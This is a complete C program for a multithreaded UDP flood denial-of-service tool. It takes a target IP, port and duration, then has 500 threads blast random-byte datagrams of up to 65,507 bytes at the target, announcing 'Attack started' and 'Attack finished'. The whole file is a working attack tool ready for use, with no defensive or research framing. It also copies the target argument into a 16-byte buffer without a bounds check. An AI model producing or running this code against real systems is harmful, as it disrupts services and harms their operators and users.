#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 500          // Increased number of threads
#define PAYLOAD_SIZE 65507       // Maximum UDP payload size

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void generate_binary_payload(char* payload, size_t size) {
    for (size_t i = 0; i < size; i++) {
        payload[i] = (char)(rand() % 256); // Random byte values
    }
}

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        size_t dynamic_size = (rand() % (PAYLOAD_SIZE - 64)) + 64; // Variable size
        generate_binary_payload(payload, dynamic_size);

        if (sendto(sock, payload, dynamic_size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];

    printf("Attack started on %s:%d for %d seconds with %d threads...\n",
           params.ip, params.port, params.duration, MAX_THREADS);

    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished.\n");

    return 0;
}
